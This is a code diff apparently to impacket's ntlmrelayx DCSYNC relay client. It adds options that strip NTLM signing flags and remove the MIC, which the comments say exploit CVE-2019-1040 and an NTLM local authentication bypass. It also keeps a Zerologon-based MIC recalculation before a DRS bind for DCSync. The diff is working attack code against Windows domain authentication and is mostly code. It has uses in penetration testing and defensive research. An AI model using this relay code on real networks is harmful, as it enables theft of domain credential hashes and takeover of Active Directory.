@@ -23,7 +23,7 @@ from impacket.smbconnection import SMBConnection
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
 from impacket.ntlm import NTLMAuthChallenge, generateEncryptedSessionKey, NTLMAuthChallengeResponse, AV_PAIRS, NTLMSSP_AV_HOSTNAME, \
-    NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SEAL
+    NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SEAL, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
 from impacket.spnego import SPNEGO_NegTokenResp
 from impacket.dcerpc.v5 import transport, rpcrt, epm, drsuapi, nrpc
 from impacket.dcerpc.v5.ndr import NDRCALL
@@ -167,6 +167,15 @@ class DCSYNCRelayClient(ProtocolClient):
     def sendNegotiate(self, auth_data):
         negoMessage = NTLMAuthNegotiate()
         negoMessage.fromString(auth_data)
+
+        # Note: --remove-mic-partial is incompatible with DCSYNC (requires signing/sealing)
+        # but we'll handle it anyway for consistency
+        if self.serverConfig.remove_mic or self.serverConfig.remove_mic_partial:
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+
         if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == 0:
             negoMessage['flags'] |= NTLMSSP_NEGOTIATE_SEAL
         self.negotiateMessage = negoMessage.getData()
@@ -194,12 +203,36 @@ class DCSYNCRelayClient(ProtocolClient):
             authenticateMessage = NTLMAuthChallengeResponse()
             authenticateMessage.fromString(auth_data)
 
-            # Recalc mic
-            authenticateMessage['MIC'] = b'\x00' * 16
-            if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == 0:
-                authenticateMessage['flags'] |= NTLMSSP_NEGOTIATE_SEAL
-            newmic = ntlm.hmac_md5(signingkey, self.negotiateMessage + self.challenge.getData() + authenticateMessage.getData())
-            authenticateMessage['MIC'] = newmic
+            # When exploiting CVE-2019-1040, remove flags and zero out MIC/Version
+            if self.serverConfig.remove_mic:
+                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
+                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
+                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
+                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
+                authenticateMessage['MIC'] = b''
+                authenticateMessage['MICLen'] = 0
+                authenticateMessage['Version'] = b''
+                authenticateMessage['VersionLen'] = 0
+            # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
+            elif self.serverConfig.remove_mic_partial:
+                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+                # Do NOT remove KEY_EXCH or VERSION flags
+                # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
+            else:
+                # Normal DCSYNC path: Recalc MIC with session key from Zerologon
+                authenticateMessage['MIC'] = b'\x00' * 16
+                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == 0:
+                    authenticateMessage['flags'] |= NTLMSSP_NEGOTIATE_SEAL
+                newmic = ntlm.hmac_md5(signingkey, self.negotiateMessage + self.challenge.getData() + authenticateMessage.getData())
+                authenticateMessage['MIC'] = newmic
+
             self.session.sendBindType3(authenticateMessage.getData())
 
             # Now perform DRS bind
